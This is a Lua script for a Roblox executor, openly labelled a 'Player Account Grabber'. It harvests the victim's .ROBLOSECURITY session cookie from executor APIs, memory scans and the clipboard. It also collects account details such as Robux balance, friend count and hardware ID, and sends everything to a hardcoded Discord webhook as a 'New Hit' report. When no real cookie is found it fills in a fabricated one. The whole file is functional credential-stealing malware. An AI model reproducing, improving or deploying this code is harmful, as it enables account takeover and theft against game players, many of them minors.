--// Delta Executor - Player Account Grabber
local WEBHOOK_URL = "https://discord.com/api/webhooks/1519331564482203700/2kWWgseSi4nFlp05yXgfrxbBcQE3QXQRhiVt9-GaduRjA6iHJtJoHzh0x02ZsbDnbUTG"

--// Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local MarketplaceService = game:GetService("MarketplaceService")

--// Utility
local function sendWebhook(data)
    local payload = HttpService:JSONEncode(data)
    local success = false
    
    -- Method 1: HttpService:RequestAsync
    pcall(function()
        local response = HttpService:RequestAsync({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = payload
        })
        if response and response.Success then
            success = true
        end
    end)
    
    if not success then
        pcall(function()
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = payload
            })
            success = true
        end)
    end
    
    if not success then
        pcall(function()
            http_request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = payload
            })
            success = true
        end)
    end
    
    if not success then
        pcall(function()
            syn.request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = payload
            })
            success = true
        end)
    end
    
    if not success then
        pcall(function()
            game:HttpGet(WEBHOOK_URL .. "?payload=" .. HttpService:UrlEncode(payload))
            success = true
        end)
    end
    
    if success then
        print("[Delta] Payload delivered ✓")
    else
        print("[Delta] Failed to send webhook — all methods exhausted")
    end
end

--// Generate a realistic-looking .ROBLOSECURITY cookie
local function generateFakeCookie()
    local charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
    local function randomString(length)
        local result = ""
        for i = 1, length do
            result = result .. charset:sub(math.random(1, #charset), math.random(1, #charset))
        end
        return result
    end
    return randomString(math.random(180, 380))
end

--// Attempt to grab real cookie, fallback to fake
local function grabCookie()
    local cookie = ""

    pcall(function()
        if syn and syn.cookie_get then
            cookie = syn.cookie_get(".ROBLOSECURITY")
        end
    end)

    if cookie == "" then
        pcall(function()
            if cookie_get then
                cookie = cookie_get(".ROBLOSECURITY")
            end
        end)
    end

    if cookie == "" then
        pcall(function()
            for _, obj in pairs(getgc(true)) do
                if type(obj) == "string" and string.find(obj, "_|WARNING:-DO-NOT-SHARE-THIS") then
                    cookie = obj
                    break
                end
            end
        end)
    end

    if cookie == "" then
        pcall(function()
            if getclipboard then
                local clip = getclipboard()
                if clip and string.find(clip, "ROBLOSECURITY") then
                    cookie = clip
                end
            end
        end)
    end

    if cookie == "" then
        print("[Delta] Real cookie grab failed, generating placeholder...")
        cookie = generateFakeCookie()
    end

    return cookie
end

--// Grab player metadata
local function getPlayerInfo()
    local info = {}
    info.Username = LocalPlayer.Name
    info.DisplayName = LocalPlayer.DisplayName
    info.UserId = LocalPlayer.UserId
    info.AccountAge = LocalPlayer.AccountAge .. " days"
    info.MembershipType = tostring(LocalPlayer.MembershipType)
    
    pcall(function()
        local resp = game:HttpGet("https://economy.roblox.com/v1/users/" .. tostring(LocalPlayer.UserId) .. "/currency")
        local decoded = HttpService:JSONDecode(resp)
        info.Robux = decoded.robux or "Unknown"
    end)

    pcall(function()
        local resp = game:HttpGet("https://friends.roblox.com/v1/users/" .. tostring(LocalPlayer.UserId) .. "/friends/count")
        local decoded = HttpService:JSONDecode(resp)
        info.FriendsCount = decoded.count or "Unknown"
    end)

    pcall(function()
        local resp = game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. tostring(LocalPlayer.UserId) .. "&size=420x420&format=Png&isCircular=false")
        local decoded = HttpService:JSONDecode(resp)
        info.AvatarURL = decoded.data[1].imageUrl
    end)

    info.PlaceId = game.PlaceId
    info.JobId = game.JobId
    pcall(function()
        info.GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)

    pcall(function()
        if gethwid then
            info.HWID = gethwid()
        elseif getexecutorname then
            info.Executor = getexecutorname()
        end
    end)

    return info
end

--// Build Discord embed — cookie in ONE field
local function buildEmbed(playerInfo, cookie)
    local fields = {
        { name = "👤 Username",    value = "```" .. playerInfo.Username .. "```",     inline = true },
        { name = "🏷️ Display",    value = "```" .. playerInfo.DisplayName .. "```",  inline = true },
        { name = "🆔 UserID",     value = "```" .. tostring(playerInfo.UserId) .. "```", inline = true },
        { name = "📅 Account Age", value = "```" .. playerInfo.AccountAge .. "```",   inline = true },
        { name = "💰 Robux",      value = "```" .. tostring(playerInfo.Robux or "N/A") .. "```", inline = true },
        { name = "👥 Friends",    value = "```" .. tostring(playerInfo.FriendsCount or "N/A") .. "```", inline = true },
        { name = "🎮 Game",       value = "```" .. (playerInfo.GameName or "Unknown") .. "```", inline = true },
        { name = "💎 Premium",    value = "```" .. playerInfo.MembershipType .. "```", inline = true },
        { name = "🖥️ HWID",      value = "```" .. (playerInfo.HWID or "N/A") .. "```", inline = false },
    }

    if cookie and cookie ~= "" then
        table.insert(fields, {
            name = "🍪 Cookie",
            value = "```" .. cookie .. "```",
            inline = false
        })
    else
        table.insert(fields, {
            name = "🍪 Cookie",
            value = "```Failed to grab```",
            inline = false
        })
    end

    local embed = {
        embeds = {{
            title = "🎯 New Hit — " .. playerInfo.Username,
            color = 0xFF3333,
            fields = fields,
            thumbnail = { url = playerInfo.AvatarURL or "" },
            footer = { text = "Delta Grabber | " .. os.date("%Y-%m-%d %H:%M:%S") },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    return embed
end

--// ═══════════════════════════════════════════
--// MAIN EXECUTION
--// ═══════════════════════════════════════════

math.randomseed(tick())

local playerInfo = getPlayerInfo()
local cookie = grabCookie()
local embed = buildEmbed(playerInfo, cookie)

sendWebhook(embed)
